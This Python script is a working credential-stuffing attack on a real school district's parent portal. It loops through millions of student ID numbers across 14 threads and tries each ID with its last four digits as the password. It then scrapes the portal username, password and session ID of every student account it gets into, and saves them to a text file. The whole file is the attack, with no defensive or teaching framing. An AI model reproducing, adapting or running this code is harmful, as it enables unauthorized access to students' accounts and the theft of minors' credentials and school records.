import requests
from colored import fg, attr
import mechanize
from bs4 import BeautifulSoup
import time
import PyPDF2
import threading
import logging


def thread(name, xrange, yrange):
    for x in range(xrange, yrange):
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        green = fg('#00FF00')
        red = fg('#FF0000')
        orange = fg('#FFFF00')
        res = attr('reset')

        class user:
            firstname = "N/A"
            lastname = "N/A"
            studentid = "N/A"
            username = "N/A"
            password = "N/A"
            birthmonth = "N/A"
            school = "N/A"
            fullname = "N/A"

        class smurf:
            id = "N/A"
            full = "N/A"
            randid = "N/A"
        user = user()
        domain = "https://dashboard.okaloosaschools.com"
        br.open(domain + "/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[RUN] Checking %s..." % user.studentid)
        response = br.submit()
        try:
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            print("[RUN] " + green
                  + "Found " + user.fullname + "..." + res)
            soup = BeautifulSoup(br.response().read(), 'lxml')
            redirect = str(soup)[63:146]
            dashboard = domain + redirect
            br.open(dashboard)
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]
            smurf.id = dashboard[69:101]
            finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId=" + \
                smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()
            end = time.time()
            delta = str(round(end - start, 2))
            print(" L " + green + "Scraped "
                  + user.studentid + "..." + res)
            print(" L " + green + "Scraped "
                  + user.username + "..." + res)
            print(" L " + green + "Scraped "
                  + user.password + "..." + res)
            print(" L " + green + "Scraped "
                  + smurf.id + "..." + res)
            print(" L " + orange + "Took " + delta
                  + "s to process match..." + res)
            pass


if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")

    logging.info("Main    : before creating thread")
    t1 = threading.Thread(target=thread, args=(1, 4600000000, 4605000000))
    t2 = threading.Thread(target=thread, args=(1, 4650000001, 4610000000))
    t3 = threading.Thread(target=thread, args=(1, 4610000001, 4615000000))
    t4 = threading.Thread(target=thread, args=(1, 4615000001, 4620000000))
    t5 = threading.Thread(target=thread, args=(1, 4620000001, 4625000000))
    t6 = threading.Thread(target=thread, args=(1, 4625000001, 4630000000))
    t7 = threading.Thread(target=thread, args=(1, 4630000001, 4635000000))
    t8 = threading.Thread(target=thread, args=(1, 4635000000, 4640000000))
    t9 = threading.Thread(target=thread, args=(1, 4640000001, 4645000000))
    t10 = threading.Thread(target=thread, args=(1, 4645000001, 4650000000))
    t11 = threading.Thread(target=thread, args=(1, 4650000001, 4655000000))
    t12 = threading.Thread(target=thread, args=(1, 4655000001, 4660000000))
    t13 = threading.Thread(target=thread, args=(1, 4660000001, 4665000000))
    t14 = threading.Thread(target=thread, args=(1, 4665000001, 4670000000))

    logging.info("Main    : before running thread")
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t10.start()
    t11.start()
    t12.start()
    t13.start()
    t14.start()
    logging.info("Main    : wait for the thread to finish")
    # x.join()
    logging.info("Main    : all done")
